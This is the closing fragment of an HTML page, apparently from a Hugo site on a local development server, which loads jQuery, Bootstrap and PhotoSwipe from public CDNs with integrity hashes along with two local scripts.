<script src="https://code.jquery.com/jquery-3.7.0.slim.min.js" integrity="sha384-w5y/xIeYixWvfM+A1cEbmHPURnvyqmVg5eVENruEdDjcyRLUSNej7512JQGspFUr" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@3.4.1/dist/js/bootstrap.min.js" integrity="sha384-aJ21OjlMXNL5UyIl/XNwTMqvzeRMZH2w8c5cRVpzpU8Y5bApTppSuUkhZXN0VxHd" crossorigin="anonymous"></script>

<script src="http://localhost:1313/js/main.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe.min.js" integrity="sha384-QELNnmcmU8IR9ZAykt67vGr9/rZJdHbiWi64V88fCPaOohUlHCqUD/unNN0BXSqy" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/photoswipe/4.1.2/photoswipe-ui-default.min.js" integrity="sha384-m67o7SkQ1ALzKZIFh4CiTA8tmadaujiTa9Vu+nqPSwDOqHrDmxLezTdFln8077+q" crossorigin="anonymous"></script><script src="http://localhost:1313/js/load-photoswipe.js"></script>










    
  </body>
</html>

